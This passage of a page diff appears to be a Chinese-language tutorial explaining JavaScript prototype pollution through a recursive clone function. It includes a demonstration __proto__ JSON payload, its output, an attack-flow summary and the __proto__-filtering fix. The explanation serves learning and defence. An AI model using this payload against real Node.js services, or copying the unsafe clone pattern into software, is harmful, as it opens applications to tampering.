+            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">keys</span>[<span style="color:#a6e22e">i</span>];
+            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">descriptor</span> <span style="color:#f92672">=</span> Object.<span style="color:#a6e22e">getOwnPropertyDescriptor</span>(<span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">key</span>);
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">descriptor</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">descriptor</span>.<span style="color:#a6e22e">get</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">descriptor</span>.<span style="color:#a6e22e">set</span>)) {
+                Object.<span style="color:#a6e22e">defineProperty</span>(<span style="color:#a6e22e">newObj</span>, <span style="color:#a6e22e">key</span>, <span style="color:#a6e22e">descriptor</span>);
+            } <span style="color:#66d9ef">else</span> {
+                <span style="color:#a6e22e">newObj</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">clone</span>(<span style="color:#a6e22e">obj</span>[<span style="color:#a6e22e">key</span>]);
             }
         }
     }
-    return newObj;
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">newObj</span>;
 }
 
-var payload = '{&quot;__proto__&quot;:{&quot;oops&quot;:&quot;It works !&quot;}}';
-var oldObj = JSON.parse(payload);
-console.log(oldObj.oops);
-var newObj = clone(oldObj);
-console.log(newObj.oops);
-</code></pre>
-
-<p>运行代码，可以发现在调用 clone 函数之前，我们尝试访问 oldObj 的 oops 属性，得到的结果是 undefined，该属性不存在；但在 clone 后得到的新对象 newObj 中，我们成功访问到了原本不存在的 oops 属性。运行结果如下：</p>
-
-<pre><code class="language-bash">$ node test.js
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{&#34;__proto__&#34;:{&#34;oops&#34;:&#34;It works !&#34;}}&#39;</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">oldObj</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">payload</span>);
+<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">oldObj</span>.<span style="color:#a6e22e">oops</span>);
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">newObj</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">clone</span>(<span style="color:#a6e22e">oldObj</span>);
+<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">newObj</span>.<span style="color:#a6e22e">oops</span>);
+</code></pre></div><p>运行代码，可以发现在调用 clone 函数之前，我们尝试访问 oldObj 的 oops 属性，得到的结果是 undefined，该属性不存在；但在 clone 后得到的新对象 newObj 中，我们成功访问到了原本不存在的 oops 属性。运行结果如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ node test.js
 undefined
 It works !
-</code></pre>
-
-<p>这说明了我们无法在 oldObj 的自有属性或原型链上找到 oops 属性，但可以在 newObj 上找到 oops 属性，那么必然在调用 clone 函数得到 newObj 的时候，newObj 的原型发生了修改，所以我们才能成功访问到 newObj 的 oops 属性。</p>
-
+</code></pre></div><p>这说明了我们无法在 oldObj 的自有属性或原型链上找到 oops 属性，但可以在 newObj 上找到 oops 属性，那么必然在调用 clone 函数得到 newObj 的时候，newObj 的原型发生了修改，所以我们才能成功访问到 newObj 的 oops 属性。</p>
 <p>追踪函数，可以定位到发生问题的操作在哪：</p>
-
-<p><figure><img src="/images/ring.svg" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20180925142829-37bb2d62-c08c-1.png" data-sizes="auto" alt="Code" title="Code" class="lazyload"><figcaption class="image-caption">Code</figcaption></figure></p>
-
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180925142829-37bb2d62-c08c-1.png" alt="Code" title="Code"></p>
 <p>很明显，在调用 <code>Object.getOwnPropertyNames(obj);</code> 后获得的键名中存在 <code>__proto__</code>，因为在这里 <code>__proto__</code> 属性是 obj 对象的一个普通的自有属性，所以可以被该函数所返回，而一般对象的 <code>__proto__</code> 属性是不会被该函数所列举出来的。而之后的 <code>newObj['__proto__'] = clone(obj['__proto__']);</code> 的赋值操作使得 newObj 的原型发生了变化。</p>
-
 <p>为了加深理解，我们可以继续看下图：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20180925142910-5003bc0e-c08c-1.png" alt="prototype" class="lazyload"><figcaption class="image-caption">prototype</figcaption></figure></p>
-
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180925142910-5003bc0e-c08c-1.png" alt="prototype"></p>
 <p>我们声明了三个 Object，分别是由 JSON.parse 生成的 oldObj，对 oldObj 调用 clone 函数生成的 newObj，以及通过对象字面量直接构造的 oriObj。</p>
-
 <p>通过对三个对象分别调用 <code>xxx.hasOwnProperty('__proto__')</code> 函数，我们可以发现只有 oldObj 在调用该函数时返回了 true；而在调用 <code>Object.getPrototypeOf(xxx)</code> 后，只有 newObj 和 oriObj 返回的是 <code>Object {oops: &quot;It works !&quot;}</code>，oldObj 返回的是 <code>Object {constructor: , __defineGetter__: , __defineSetter__: , hasOwnProperty: , __lookupGetter__: , …}</code>。这说明 oldObj 的 <code>__proto__</code> 属性与其余二者不同，并非是指向原型的属性，而是一个普通的自有属性，与其余的自有属性并没有什么区别，只是恰好名字较为敏感。</p>
-
 <p>这就解释了上面的现象，为什么在 JSON.parse 后得到的对象不存在 prototype pollution 的问题，因为此时其所具有的 <code>__proto__</code> 属性仅仅是一个普通的自有属性，对象在查找属性时会在真正的原型上进行查找，但在执行 clone 函数的过程中，由于该属性名字的特殊性，触发了新对象的原型的修改，最终导致了 prototype pollution。</p>
-
 <p>对 js 如何查找对象属性感兴趣的同学可以继续参考下图：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20180925144510-8c7aa826-c08e-1.png" alt="attribute found" class="lazyload"><figcaption class="image-caption">attribute found</figcaption></figure></p>
-
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180925144510-8c7aa826-c08e-1.png" alt="attribute found"></p>
 <h2 id="总结">总结</h2>
-
 <p>至此，我们再来梳理一下 prototype pollution attack 触发的流程：</p>
-
 <ol>
 <li>攻击者发送的字符串 <code>{&quot;__proto__&quot;:{&quot;oops&quot;:&quot;It works !&quot;}}</code> 在被服务端调用 JSON.parse 解析后得到 obj1，但 obj1 的原型是安全的，此时 <code>__proto__</code> 仅仅是 obj1 的一个普通的自有属性</li>
 <li>服务端调用 clone 或类似具有风险的函数，得到了新的对象 obj2，此时 obj2 的原型已经被污染，指向了攻击者注入的属性 <code>{&quot;oops&quot;:&quot;It works !&quot;}</code></li>
 <li>服务端调用新的对象 obj2时，触发可能的危险操作</li>
 </ol>
-
 <p>对该攻击的防御也很简单，在赋值操作时注意危险的 <code>__proto__</code> 属性即可。</p>
-
 <p>举例说明，下图是 npm 上的库 hoek 在 prototype pollution attack 发生后提交的 patch，可以看到只要简单的过滤即可防御该攻击：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20180925143329-ea8cb334-c08c-1.png" alt="Patch" class="lazyload"><figcaption class="image-caption">Patch</figcaption></figure></p>
-
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180925143329-ea8cb334-c08c-1.png" alt="Patch"></p>
 <h2 id="参考链接">参考链接</h2>
-
 <ul>
-<li><a href="https://dinhbaoluciusteam.wordpress.com/2018/09/23/defcamp-dctf-2018-chat/" rel="nofollow noreferrer" target="_blank">Defcamp (DCTF) 2018 – Chat</a></li>
-<li><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf" rel="nofollow noreferrer" target="_blank">Prototype pollution attack in NodeJS application</a></li>
-<li><a href="https://hackerone.com/reports/310439" rel="nofollow noreferrer" target="_blank">Prototype pollution attack (Hoek)</a></li>
-<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object" rel="nofollow noreferrer" target="_blank">Object - MDN 文档</a></li>
-<li><a href="https://www.cnblogs.com/shuiyi/p/5305435.html" rel="nofollow noreferrer" target="_blank">三张图搞懂JavaScript的原型对象与原型链</a></li>
+<li><a href="https://dinhbaoluciusteam.wordpress.com/2018/09/23/defcamp-dctf-2018-chat/">Defcamp (DCTF) 2018 – Chat</a></li>
+<li><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">Prototype pollution attack in NodeJS application</a></li>
+<li><a href="https://hackerone.com/reports/310439">Prototype pollution attack (Hoek)</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object">Object - MDN 文档</a></li>
+<li><a href="https://www.cnblogs.com/shuiyi/p/5305435.html">三张图搞懂JavaScript的原型对象与原型链</a></li>
 </ul>
 
     </div>
